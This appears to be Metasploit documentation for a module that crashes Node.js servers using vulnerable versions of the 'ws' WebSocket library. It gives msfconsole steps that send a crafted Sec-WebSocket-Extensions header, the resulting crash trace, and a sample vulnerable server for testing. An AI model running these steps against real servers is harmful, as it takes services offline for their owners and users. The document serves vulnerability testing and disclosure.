## Vulnerable Application
ws < 1.1.5 || (2.0.0 , 3.3.1)
https://nodesecurity.io/advisories/550

## Vulnerable Analysis
This module exploits a Denial of Service vulnerability in npm module "ws".
By sending a specially crafted value of the Sec-WebSocket-Extensions header 
on the initial WebSocket upgrade request, the ws component will crash.

## Verification Steps
1. Start the vulnerable server using the sample server code below `node server.js`
2. Start `msfconsole`
3. `use auxiliary/dos/http/ws_dos`
4. `set RHOST <IP>`
5. `run`
6. The server should crash

## Options
None.

## Scenarios

## Server output from crash
```
/Users/sonatype/Downloads/node_modules/ws/lib/Extensions.js:40
    paramsList.push(parsedParams);
               ^

TypeError: paramsList.push is not a function
    at value.split.forEach (/Users/sonatype/Downloads/node_modules/ws/lib/Extensions.js:40:16)
    at Array.forEach (<anonymous>)
    at Object.parse (/Users/sonatype/Downloads/node_modules/ws/lib/Extensions.js:15:20)
    at WebSocketServer.completeUpgrade (/Users/sonatype/Downloads/node_modules/ws/lib/WebSocketServer.js:230:30)
    at WebSocketServer.handleUpgrade (/Users/sonatype/Downloads/node_modules/ws/lib/WebSocketServer.js:197:10)
    at Server.WebSocketServer._ultron.on (/Users/sonatype/Downloads/node_modules/ws/lib/WebSocketServer.js:87:14)
    at emitThree (events.js:136:13)
    at Server.emit (events.js:217:7)
    at onParserExecuteCommon (_http_server.js:495:14)
    at onParserExecute (_http_server.js:450:3)
```

## Sample server
```
const WebSocket = require('ws');
const wss = new WebSocket.Server(
{ port: 3000 }
);
wss.on('connection', function connection(ws) {
console.log('connected');
ws.on('message', function incoming(message)
{ console.log('received: %s', message); }
);
ws.on('error', function (err)
{ console.error(err); }
);
});
```
